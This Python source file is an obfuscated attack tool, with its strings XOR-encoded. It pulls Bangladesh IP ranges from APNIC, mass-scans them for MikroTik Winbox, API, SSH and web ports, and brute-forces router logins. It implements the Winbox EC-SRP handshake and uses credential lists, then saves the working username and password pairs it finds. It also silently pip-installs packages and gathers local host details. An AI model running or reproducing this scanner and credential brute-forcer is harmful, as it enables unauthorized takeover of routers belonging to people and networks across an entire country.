#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import print_function
def _z(e, k):
    return bytes([int(e[i:i + 2], 16) ^ k for i in range(0, len(e), 2)]).decode('utf-8')
import argparse
import hashlib
import os
import secrets
import signal
import socket
import ssl
import subprocess
import sys
_pause_requested = False
_stop_requested = False

def _check_pause_and_stop():
    global _pause_requested, _stop_requested
    if _stop_requested:
        print(_s(_z('50092e352a2a3f3e7a72192e283671197374', 90), Y))
        sys.exit(130)
    if not _pause_requested:
        return
    _pause_requested = False
    try:
        print(_s(_z('507a7a010a3b2f293f3e077a0a283f29297a1f342e3f287a2e357a3935342e33342f3f767a192e283671197a2e357a292e352a74', 90), Y))
        input()
    except KeyboardInterrupt:
        _stop_requested = True
        print(_s(_z('50092e352a2a3f3e7a72192e283671197374', 90), Y))
        sys.exit(130)

def _sigtstp_handler(signum, frame):
    global _pause_requested
    _pause_requested = True
try:
    from urllib.request import urlopen
except ImportError:
    urlopen = None

def _ensure_requirements():
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        req_path = os.path.join(script_dir, _z('283f2b2f33283f373f342e29742e222e', 90))
        if not os.path.isfile(req_path):
            return []
        _pkg_to_import = {_z('3f393e293b', 90): _z('3f393e293b', 90), _z('2a233928232a2e353e35373f', 90): _z('1928232a2e35', 90)}
        to_install = []
        with open(req_path, _z('28', 90), encoding=_z('2f2e3c7762', 90), errors=_z('283f2a363b393f', 90)) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith(_z('79', 90)):
                    continue
                pkg = line.split(_z('6767', 90))[0].split(_z('6467', 90))[0].split(_z('01', 90))[0].strip()
                if not pkg:
                    continue
                mod = _pkg_to_import.get(pkg.lower(), pkg.split(_z('01', 90))[0])
                try:
                    __import__(mod)
                except ImportError:
                    to_install.append(pkg)
        for pkg in to_install:
            try:
                subprocess.run([sys.executable, _z('7737', 90), _z('2a332a', 90), _z('3334292e3b3636', 90), _z('772b', 90), pkg], capture_output=True, timeout=120, check=False)
            except Exception:
                pass
        for pkg in to_install:
            mod = _pkg_to_import.get(pkg.lower(), pkg.split(_z('01', 90))[0])
            try:
                __import__(mod)
            except ImportError:
                pass
        return to_install
    except Exception:
        return []
APNIC_URL = _z('322e2e2a296075753c2e2a743b2a34333974343f2e75292e3b2e29753b2a343339753e3f363f3d3b2e3f3e773b2a34333977363b2e3f292e', 90)
BANGLADESH_IP_FILE = _z('183b343d363b3e3f2932130a742e222e', 90)
BRUTEFORCE_OUT_FILE = _z('18282f2e3f1c3528393f17333128352e3331742e222e', 90)

def _is_termux():
    try:
        if os.environ.get(_z('0e1f08170f02050c1f0809131514', 90)):
            return True
        if os.environ.get(_z('0a081f1c1302', 90), _z('', 90)).find(_z('2e3f28372f22', 90)) >= 0:
            return True
        if os.environ.get(_z('1b141e0815131e050815150e', 90)) or os.environ.get(_z('1b141e0815131e051e1b0e1b', 90)):
            return True
        if os.path.exists(_z('753e3b2e3b753e3b2e3b75393537742e3f28372f22753c33363f29752f2928', 90)):
            return True
    except Exception:
        pass
    return False

def _scan_tuning():
    if _is_termux():
        return (0.25, 200)
    return (0.35, 1200)

def _color_enabled():
    try:
        return hasattr(sys.stdout, _z('33293b2e2e23', 90)) and sys.stdout.isatty()
    except Exception:
        return False
_C = _color_enabled()
R = _z('41016a37', 90) if _C else _z('', 90)
B = _z('41016b37', 90) if _C else _z('', 90)
G = _z('41016b61696837', 90) if _C else _z('', 90)
C = _z('41016b61696c37', 90) if _C else _z('', 90)
Y = _z('41016b61696937', 90) if _C else _z('', 90)
X = _z('41016b61696b37', 90) if _C else _z('', 90)
W = _z('41016b61696d37', 90) if _C else _z('', 90)
D = _z('41016a61636a37', 90) if _C else _z('', 90)
g = _z('41016a61696837', 90) if _C else _z('', 90)
c = _z('41016a61696c37', 90) if _C else _z('', 90)

def _s(t, style):
    return style + str(t) + R if _C else str(t)

def _egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, y, x = _egcd(b % a, a)
    return (g, x - b // a * y, y)

def _modinv(a, p):
    if a < 0:
        a = a % p
    g, x, _ = _egcd(a, p)
    if g != 1:
        raise Exception(_z('37353e2f363b287a33342c3f28293f7a3e353f297a34352e7a3f2233292e', 90))
    return x % p

def _legendre_symbol(a, p):
    l = pow(a, (p - 1) // 2, p)
    if l == p - 1:
        return -1
    return l

def _prime_mod_sqrt(a, p):
    a %= p
    if a == 0:
        return [0]
    if p == 2:
        return [a]
    if _legendre_symbol(a, p) != 1:
        return []
    if p % 4 == 3:
        x = pow(a, (p + 1) // 4, p)
        return [x, p - x]
    q, s = (p - 1, 0)
    while q % 2 == 0:
        s += 1
        q //= 2
    z = 1
    while _legendre_symbol(z, p) != -1:
        z += 1
    c = pow(z, q, p)
    x = pow(a, (q + 1) // 2, p)
    t = pow(a, q, p)
    m = s
    while t != 1:
        i, e = (0, 2)
        for i in range(1, m):
            if pow(t, e, p) == 1:
                break
            e *= 2
        b = pow(c, 2 ** (m - i - 1), p)
        x = x * b % p
        t = t * b * b % p
        c = b * b % p
        m = i
    return [x, p - x]

class WCurve:

    def __init__(self):
        self.__p = 57896044618658097711785492504343953926634992332820282019728792003956564819949
        self.__r = 7237005577332262213973186563042994240857116359379907606001950938285454250989
        self.__mont_a = 486662
        self.__conversion_from_m = self.__mont_a * _modinv(3, self.__p) % self.__p
        self.__conversion = (self.__p - self.__mont_a * _modinv(3, self.__p)) % self.__p
        self.__a = 19298681539552699237261830834781317975544997444273427339909597334573241639236
        self.__b = 55751746669818908907645289078257140818241103727901012315294400837956729358436
        self.__h = 8
        try:
            import ecdsa
        except ImportError:
            raise ImportError(_z('0d33343835227a343f3f3e297a3f393e293b607a2a332a7a3334292e3b36367a3f393e293b', 90))
        self.__curve = ecdsa.ellipticcurve.CurveFp(self.__p, self.__a, self.__b, self.__h)
        self.__g = self.lift_x(9, 0)

    def gen_public_key(self, priv):
        assert len(priv) == 32
        priv = int.from_bytes(priv, _z('38333d', 90))
        pt = priv * self.__g
        return self.to_montgomery(pt)

    def to_montgomery(self, pt):
        import ecdsa
        assert type(pt) in (ecdsa.ellipticcurve.PointJacobi, ecdsa.ellipticcurve.Point)
        x = (pt.x() + self.__conversion) % self.__p
        return (int(x).to_bytes(32, _z('38333d', 90)), pt.y() & 1)

    def lift_x(self, x, parity):
        import ecdsa
        x = x % self.__p
        y_squared = (x ** 3 + self.__mont_a * x ** 2 + x) % self.__p
        x += self.__conversion_from_m
        x %= self.__p
        ys = _prime_mod_sqrt(y_squared, self.__p)
        if ys:
            pt1 = ecdsa.ellipticcurve.PointJacobi(self.__curve, x, ys[0], 1, self.__r)
            pt2 = ecdsa.ellipticcurve.PointJacobi(self.__curve, x, ys[1], 1, self.__r)
            if pt1.y() & 1 == 1 and parity != 0:
                return pt1
            if pt2.y() & 1 == 1 and parity != 0:
                return pt2
            if pt1.y() & 1 == 0 and parity == 0:
                return pt1
            return pt2
        return -1

    def redp1(self, x, parity):
        x = hashlib.sha256(x).digest()
        while True:
            x2 = hashlib.sha256(x).digest()
            pt = self.lift_x(int.from_bytes(x2, _z('38333d', 90)), parity)
            if pt == -1:
                x = (int.from_bytes(x, _z('38333d', 90)) + 1).to_bytes(32, _z('38333d', 90))
            else:
                break
        return pt

    def gen_password_validator_priv(self, username, password, salt):
        assert len(salt) == 16
        return hashlib.sha256(salt + hashlib.sha256((username + _z('60', 90) + password).encode(_z('2f2e3c7762', 90))).digest()).digest()

    def check(self, a):
        left = a.y() ** 2 % self.__p
        right = (a.x() ** 3 + self.__a * a.x() * 1 ** 4 + self.__b * 1 ** 6) % self.__p
        return left == right

    def finite_field_value(self, a):
        return a % self.__r

def _sha2(data):
    return hashlib.sha256(data).digest()

class WinboxAuth:

    def __init__(self, host, port=8291, timeout=10.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket = None
        self.w = WCurve()
        self.stage = -1
        self.s_a = b''
        self.x_w_a = b''
        self.x_w_a_parity = -1
        self.x_w_b = b''
        self.x_w_b_parity = -1
        self.j = b''
        self.z = b''
        self.client_cc = b''
        self.server_cc = b''
        self.msg = b''
        self.resp = b''

    def _open_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect((self.host, self.port))
        self.socket = s
        self.stage = 0

    def _recv_until(self, need):
        while len(self.resp) < need:
            try:
                chunk = self.socket.recv(4096)
            except (socket.timeout, socket.error, OSError):
                return False
            if not chunk:
                return False
            self.resp += chunk
        return True

    def _gen_shared_secret(self, salt, username, password):
        i = self.w.gen_password_validator_priv(username, password, salt)
        x_gamma, _ = self.w.gen_public_key(i)
        v = self.w.redp1(x_gamma, 1)
        w_b = self.w.lift_x(int.from_bytes(self.x_w_b, _z('38333d', 90)), self.x_w_b_parity)
        w_b += v
        self.j = _sha2(self.x_w_a + self.x_w_b)
        pt = int.from_bytes(i, _z('38333d', 90)) * int.from_bytes(self.j, _z('38333d', 90))
        pt += int.from_bytes(self.s_a, _z('38333d', 90))
        pt = self.w.finite_field_value(pt)
        pt = pt * w_b
        self.z, _ = self.w.to_montgomery(pt)

    def auth(self, username, password):
        while True:
            if self.stage == -1:
                if self.socket:
                    try:
                        self.socket.close()
                    except Exception:
                        pass
                    self.socket = None
                self._open_socket()
            elif self.stage == 0:
                self.s_a = secrets.token_bytes(32)
                self.x_w_a, self.x_w_a_parity = self.w.gen_public_key(self.s_a)
                if not self.w.check(self.w.lift_x(int.from_bytes(self.x_w_a, _z('38333d', 90)), self.x_w_a_parity)):
                    self.stage = -1
                    continue
                self.msg = username.encode(_z('2f2e3c7762', 90)) + b'\x00'
                self.msg += self.x_w_a + int(self.x_w_a_parity).to_bytes(1, _z('38333d', 90))
                self.msg = len(self.msg).to_bytes(1, _z('38333d', 90)) + b'\x06' + self.msg
                self.stage = 1
            elif self.stage == 1:
                resp_len = self.resp[0]
                self.resp = self.resp[2:]
                if len(self.resp) != resp_len:
                    return False
                self.x_w_b = self.resp[:32]
                self.x_w_b_parity = self.resp[32]
                salt = self.resp[33:]
                if len(salt) != 16:
                    return False
                self._gen_shared_secret(salt, username, password)
                self.j = _sha2(self.x_w_a + self.x_w_b)
                self.client_cc = _sha2(self.j + self.z)
                self.msg = len(self.client_cc).to_bytes(1, _z('38333d', 90)) + b'\x06' + self.client_cc
                self.stage = 2
            elif self.stage == 2:
                self.server_cc = _sha2(self.j + self.client_cc + self.z)
                if len(self.resp) < 34:
                    return False
                if self.resp[2:34] != self.server_cc:
                    return False
                self.stage = 3
            elif self.stage == 3:
                if self.socket:
                    try:
                        self.socket.close()
                    except Exception:
                        pass
                return True
            if self.msg and self.socket:
                self.socket.send(self.msg)
                self.msg = b''
                self.resp = b''
                if not self._recv_until(2):
                    if self.socket:
                        try:
                            self.socket.close()
                        except Exception:
                            pass
                    return False
                need = 2 + self.resp[0]
                if need > 1024:
                    return False
                if not self._recv_until(need):
                    if self.socket:
                        try:
                            self.socket.close()
                        except Exception:
                            pass
                    return False
        return False

def winbox_login(host, username, password, port=8291, timeout=10.0):
    try:
        c = WinboxAuth(host, port=port, timeout=timeout)
        if c.auth(username, password):
            return (True, _z('0d33343835227a36353d33347a15117a7239283f3e3f342e333b36297a2c3b36333e73', 90))
        return (False, _z('13342c3b36333e7a2f293f28343b373f7a35287a2a3b29292d35283e7a720d333438352273', 90))
    except Exception as e:
        return (False, str(e) if e else _z('13342c3b36333e7a2f293f28343b373f7a35287a2a3b29292d35283e7a720d333438352273', 90))

def _ip_to_int(ip_str):
    parts = ip_str.strip().split(_z('74', 90))
    if len(parts) != 4:
        return None
    try:
        return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
    except (ValueError, TypeError):
        return None

def _int_to_ip(n):
    return _z('2127742127742127742127', 90).format(n >> 24 & 255, n >> 16 & 255, n >> 8 & 255, n & 255)

def parse_ip_range(s):
    s = s.strip().lower()
    if _z('7a2e357a', 90) in s:
        a, b = s.split(_z('7a2e357a', 90), 1)
    elif _z('77', 90) in s:
        a, b = s.split(_z('77', 90), 1)
        a, b = (a.strip(), b.strip())
    else:
        return None
    start = _ip_to_int(a)
    end = _ip_to_int(b)
    if start is None or end is None or start > end:
        return None
    return (start, end)

def ip_range_generator(start_int, end_int):
    for n in range(start_int, end_int + 1):
        yield _int_to_ip(n)

def fetch_apnic_bangladesh_ranges():
    if urlopen is None:
        return (None, _z('2f28363633387a34352e7a3b2c3b33363b38363f', 90))
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urlopen(APNIC_URL, timeout=30, context=ctx) as r:
            data = r.read().decode(_z('2f2e3c7762', 90), errors=_z('283f2a363b393f', 90))
    except Exception as e:
        return (None, str(e))
    ranges = []
    for line in data.splitlines():
        line = line.strip()
        if not line or line.startswith(_z('79', 90)):
            continue
        parts = line.split(_z('26', 90))
        if len(parts) < 5:
            continue
        if parts[0] != _z('3b2a343339', 90) or parts[1] != _z('181e', 90) or parts[2] != _z('332a2c6e', 90):
            continue
        base_ip = parts[3]
        count = int(parts[4])
        start_int = _ip_to_int(base_ip)
        if start_int is None or count <= 0:
            continue
        end_int = start_int + count - 1
        ranges.append((start_int, end_int))
    return (sorted(ranges, key=lambda x: x[0]), None)

def save_bangladesh_ranges(ranges, filepath=BANGLADESH_IP_FILE):
    try:
        with open(filepath, _z('2d', 90), encoding=_z('2f2e3c7762', 90)) as f:
            for start_int, end_int in ranges:
                f.write(_z('212776212750', 90).format(_int_to_ip(start_int), _int_to_ip(end_int)))
        return (True, None)
    except IOError as e:
        return (False, str(e))

def load_bangladesh_ranges(filepath=BANGLADESH_IP_FILE):
    ranges = []
    try:
        with open(filepath, _z('28', 90), encoding=_z('2f2e3c7762', 90), errors=_z('283f2a363b393f', 90)) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(_z('76', 90), 1)
                if len(parts) != 2:
                    continue
                start_int = _ip_to_int(parts[0].strip())
                end_int = _ip_to_int(parts[1].strip())
                if start_int is not None and end_int is not None and (start_int <= end_int):
                    ranges.append((start_int, end_int))
        return (ranges, None)
    except IOError as e:
        return (None, str(e))

def check_ip_online(ip, port, timeout=0.3):
    return check_port(ip, port, timeout)

def scan_range_online(start_ip, end_ip, port=8291, timeout=0.3, max_workers=400):
    start_int = _ip_to_int(start_ip) if isinstance(start_ip, str) else start_ip
    end_int = _ip_to_int(end_ip) if isinstance(end_ip, str) else end_ip
    if start_int is None or end_int is None or start_int > end_int:
        return []
    total = end_int - start_int + 1
    online = []
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
    except ImportError:
        for ip in ip_range_generator(start_int, end_int):
            if check_ip_online(ip, port, timeout):
                online.append(ip)
        return online

    def try_ip(ip):
        return ip if check_ip_online(ip, port, timeout) else None
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(try_ip, ip): ip for ip in ip_range_generator(start_int, end_int)}
        for fut in as_completed(futures):
            ip = fut.result()
            if ip is not None:
                online.append(ip)
    return sorted(online, key=lambda x: _ip_to_int(x))
DEFAULT_SCAN_PORTS = [8291, 8728, 8729, 2025, 10001]
WINBOX_TRY_PORTS = {8291, 8728, 8729, 2025, 10001}
MIKROTIK_WEB_FILE = "MikrotikWebFound.txt"
WEB_SCAN_PORTS = [80, 8080]

def check_web_routeros(ip, port, timeout=3.0):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
            response = sock.recv(4096).decode("utf-8", errors="replace")
            return "HTTP" in response and "<title>RouterOS</title>" in response
    except Exception:
        return False

def scan_range_default_ports(start_int, end_int, ports=None, timeout=0.35, max_workers=400):
    if ports is None:
        ports = DEFAULT_SCAN_PORTS
    ip_list = list(ip_range_generator(start_int, end_int))
    results = []
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
    except ImportError:
        for ip in ip_list:
            open_ports = [p for p in ports if check_port(ip, p, timeout)]
            if open_ports:
                results.append((ip, sorted(open_ports)))
        return sorted(results, key=lambda x: _ip_to_int(x[0]))

    def check_one_ip(ip):
        open_ports = [p for p in ports if check_port(ip, p, timeout)]
        return (ip, sorted(open_ports)) if open_ports else (ip, None)
    with ThreadPoolExecutor(max_workers=min(max_workers, len(ip_list))) as ex:
        futures = {ex.submit(check_one_ip, ip): ip for ip in ip_list}
        for fut in as_completed(futures):
            ip, open_ports = fut.result()
            if open_ports:
                results.append((ip, open_ports))
    return sorted(results, key=lambda x: _ip_to_int(x[0]))

def scan_range_all_ports(start_int, end_int, port_timeout=0.4, port_workers=1000, ip_workers=6):
    ip_list = list(ip_range_generator(start_int, end_int))
    results = []
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
    except ImportError:
        for ip in ip_list:
            ports = scan_all_open_ports(ip, timeout=port_timeout, max_workers=port_workers)
            if ports:
                results.append((ip, ports))
        return sorted(results, key=lambda x: _ip_to_int(x[0]))

    def check_one_ip(ip):
        open_ports = scan_all_open_ports(ip, timeout=port_timeout, max_workers=port_workers)
        return (ip, open_ports)
    max_ip_workers = min(ip_workers, len(ip_list))
    with ThreadPoolExecutor(max_workers=max_ip_workers) as ex:
        futures = {ex.submit(check_one_ip, ip): ip for ip in ip_list}
        for fut in as_completed(futures):
            ip, ports = fut.result()
            if ports:
                results.append((ip, ports))
    return sorted(results, key=lambda x: _ip_to_int(x[0]))

def check_port(host, port, timeout=3.0):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, socket.error, OSError):
        return False

def check_api_login(host, username, password, port=8728, timeout=5.0):
    try:
        from librouteros import connect
    except ImportError:
        return (False, _z('36333828352f2e3f2835297a34352e7a3334292e3b36363f3e7a722a332a7a3334292e3b36367a36333828352f2e3f28352973', 90))
    try:
        api = connect(username=username, password=password, host=host, port=port, timeout=timeout)
        api.path(_z('752923292e3f3775283f29352f28393f', 90)).select(_z('2c3f2829333534', 90), _z('38353b283e77343b373f', 90)).get()
        api.close()
        return (True, _z('08352f2e3f2815097a1b0a137a36353d33347a1511', 90))
    except Exception as e:
        err = str(e).strip()
        if _z('33342c3b36333e', 90) in err.lower() or _z('36353d3334', 90) in err.lower():
            return (False, _z('13342c3b36333e7a2f293f28343b373f7a35287a2a3b29292d35283e', 90))
        if _z('393534343f392e333534', 90) in err.lower() or _z('283f3c2f293f3e', 90) in err.lower() or _z('2e33373f3e7a352f2e', 90) in err.lower():
            return (False, _z('193534343f392e3335347a3c3b33363f3e607a', 90) + err)
        return (False, err)

def check_ssh_login(host, username, password, port=22, timeout=5.0):
    try:
        import paramiko
    except ImportError:
        return (False, _z('2a3b283b373331357a34352e7a3334292e3b36363f3e7a722a332a7a3334292e3b36367a2a3b283b3733313573', 90))
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout, allow_agent=False, look_for_keys=False)
        client.close()
        return (True, _z('0909127a36353d33347a1511', 90))
    except paramiko.AuthenticationException:
        return (False, _z('13342c3b36333e7a2f293f28343b373f7a35287a2a3b29292d35283e7a7209091273', 90))
    except Exception as e:
        return (False, str(e))
WINBOX_PORTS = [8291, 2025, 10001, 8729, 8080, 443, 80, 8728]

def scan_all_open_ports(host, timeout=None, max_workers=None):
    if timeout is None or max_workers is None:
        t, w = _scan_tuning()
        timeout = timeout if timeout is not None else t
        max_workers = max_workers if max_workers is not None else w
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
    except ImportError:
        return [p for p in range(65536) if check_port(host, p, timeout)]
    open_ports = []
    total = 65536
    batch_size = 1500 if _is_termux() else 5000
    done_count = 0

    def try_port(port):
        return port if check_port(host, port, timeout) else None

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        for start in range(0, total, batch_size):
            end = min(start + batch_size, total)
            batch = list(range(start, end))
            futures = {ex.submit(try_port, p): p for p in batch}
            for fut in as_completed(futures):
                try:
                    p = fut.result()
                    done_count += 1
                    if p is not None:
                        open_ports.append(p)
                        print(_s("  -> port ", G) + _s("{}".format(p), c) + _s(" open", D), flush=True)
                except Exception:
                    done_count += 1
                    pass
            print(_s("  Progress: ", D) + _s("{}".format(done_count), C) + _s("/65536", D) + (_s("  open: ", D) + _s(", ".join(str(x) for x in sorted(open_ports)), g) if open_ports else _s("", D)), flush=True)
    return sorted(open_ports)

def find_winbox_port(host, timeout=1.5):
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
    except ImportError:
        for port in WINBOX_PORTS:
            if check_port(host, port, timeout):
                return port
        return None

    def try_port(port):
        return port if check_port(host, port, timeout) else None
    open_ports = []
    with ThreadPoolExecutor(max_workers=len(WINBOX_PORTS)) as ex:
        futures = {ex.submit(try_port, p): p for p in WINBOX_PORTS}
        for fut in as_completed(futures):
            p = fut.result()
            if p is not None:
                open_ports.append(p)
    for port in WINBOX_PORTS:
        if port in open_ports:
            return port
    return None

def print_valid_found(host, port, username, password):
    user_display = username or _z('723f372a2e2373', 90)
    pass_display = password if password else _z('723f372a2e2373', 90)
    sep = _s(_z('67', 90) * 50, G)
    print(_z('', 90))
    print(sep)
    print(_s(_z('7a7a64647a16151d13147a1c150f141e7a6666', 90), G + B))
    print(sep)
    print(_z('7a7a', 90) + _s(_z('1235292e607a7a7a7a', 90), C) + _s(_z('2127602127', 90).format(host, port), G))
    print(_z('7a7a', 90) + _s(_z('0f293f28343b373f60', 90), C) + _s(_z('7a2127', 90).format(user_display), G))
    print(_z('7a7a', 90) + _s(_z('0a3b29292d35283e60', 90), C) + _s(_z('7a2127', 90).format(pass_display), G))
    print(_z('', 90))
    print(_z('7a7a', 90) + _s(_z('0d333438352260', 90), c) + _s(_z('7a2127602127', 90).format(host, port), g))
    print(_z('7a7a', 90) + _s(_z('722f293f28607a21277a7a2a3b2929607a212773', 90).format(user_display, pass_display), D))
    print(sep)
    print(_z('', 90))

def _try_credentials_one_ip(ip, ports, pairs, out_file, try_timeout=2.5, max_workers=100):
    tasks = [(ip, port, u, p) for port in ports for u, p in pairs]
    if not tasks:
        return 0
    valid_count = 0

    def _one(item):
        ip_, port, username, password = item
        try:
            ok, _ = winbox_login(ip_, username, password, port=port, timeout=try_timeout)
            return (ip_, port, username, password, ok)
        except Exception:
            return (ip_, port, username, password, False)
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
    except ImportError:
        for item in tasks:
            ip_, port, u, p = item
            try:
                ok = winbox_login(ip_, u, p, port=port, timeout=try_timeout)[0]
            except Exception:
                ok = False
            if ok:
                print_valid_found(ip_, port, u, p)
                valid_count += 1
                with open(out_file, _z('3b', 90), encoding=_z('2f2e3c7762', 90)) as f:
                    f.write(_z('21276021277a7a21277a7a212750', 90).format(ip_, port, u or _z('723f372a2e2373', 90), p if p else _z('723f372a2e2373', 90)))
        return valid_count
    with ThreadPoolExecutor(max_workers=min(max_workers, len(tasks))) as ex:
        futures = {ex.submit(_one, t): t for t in tasks}
        for fut in as_completed(futures):
            try:
                ip_, port, username, password, success = fut.result()
            except ImportError:
                raise
            except Exception:
                continue
            if success:
                print_valid_found(ip_, port, username, password)
                valid_count += 1
                with open(out_file, _z('3b', 90), encoding=_z('2f2e3c7762', 90)) as f:
                    f.write(_z('21276021277a7a21277a7a212750', 90).format(ip_, port, username or _z('723f372a2e2373', 90), password if password else _z('723f372a2e2373', 90)))
    return valid_count

def load_userpass(filepath):
    pairs = []
    try:
        with open(filepath, _z('28', 90), encoding=_z('2f2e3c7762', 90), errors=_z('283f2a363b393f', 90)) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith(_z('79', 90)) or line.startswith(_z('7575', 90)):
                    continue
                if _z('53', 90) not in line:
                    continue
                parts = line.split(_z('53', 90), 1)
                user = parts[0].strip()
                passwd = parts[1].strip() if len(parts) > 1 else _z('', 90)
                if user == _z('663f372a2e2364', 90):
                    user = _z('', 90)
                if passwd == _z('663f372a2e2364', 90):
                    passwd = _z('', 90)
                pairs.append((user, passwd))
    except IOError as e:
        return (None, str(e))
    return (pairs, None)

def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect((_z('62746274627462', 90), 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return None

def _get_system_info():
    info = {}
    info[_z('3635393b3605332a', 90)] = _get_local_ip()
    try:
        info[_z('3235292e343b373f', 90)] = socket.gethostname()
    except Exception:
        info[_z('3235292e343b373f', 90)] = _z('b8dace', 90)
    info[_z('2a232e323534', 90)] = _z('2127742127742127', 90).format(sys.version_info.major, sys.version_info.minor, sys.version_info.micro)
    info[_z('2a363b2e3c352837', 90)] = sys.platform
    info[_z('2e3f28372f22', 90)] = _is_termux()
    return info

def print_banner():
    print(_z('', 90))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfceb8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcd', 90), C))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7ab8ccd2b8ccd2b8cfcd7a7a7a7ab8ccd2b8ccd2b8cfcd7a7ab8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8cfcd7ab8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8cfcd7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7ab8ccd2b8ccd2b8cfcb7a7a7a7ab8ccd2b8ccd2b8cfcb7ab8ccd2b8ccd2b8cfceb8cfcab8cfcab8ccd2b8ccd2b8cfcdb8cfc0b8cfcab8cfcab8ccd2b8ccd2b8cfceb8cfcab8cfcab8cfc77a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7ab8ccd2b8ccd2b8cfcb7ab8ccd2b8cfcd7ab8ccd2b8ccd2b8cfcb7ab8cfc0b8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8cfceb8cfc77a7a7ab8ccd2b8ccd2b8cfcb7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7ab8ccd2b8ccd2b8cfcbb8ccd2b8ccd2b8ccd2b8cfcdb8ccd2b8ccd2b8cfcb7ab8ccd2b8ccd2b8cfceb8cfcab8cfcab8ccd2b8ccd2b8cfcd7a7a7ab8ccd2b8ccd2b8cfcb7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7ab8cfc0b8ccd2b8ccd2b8ccd2b8cfceb8ccd2b8ccd2b8ccd2b8cfceb8cfc77ab8cfc0b8ccd2b8ccd2b8ccd2b8ccd2b8ccd2b8cfceb8cfc77a7a7ab8ccd2b8ccd2b8cfcb7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7a7ab8cfc0b8cfcab8cfcab8cfc7b8cfc0b8cfcab8cfcab8cfc77a7a7ab8cfc0b8cfcab8cfcab8cfcab8cfcab8cfc77a7a7a7ab8cfc0b8cfcab8cfc77a0e7a1f7a1b7a177a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfcb7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7ab8cfcb', 90), G))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cfc0b8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfc7', 90), C))
    print(_s(_z('7a7a', 90), _z('', 90)) + _s(_z('b8cffab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cfcab8cff9', 90), C))
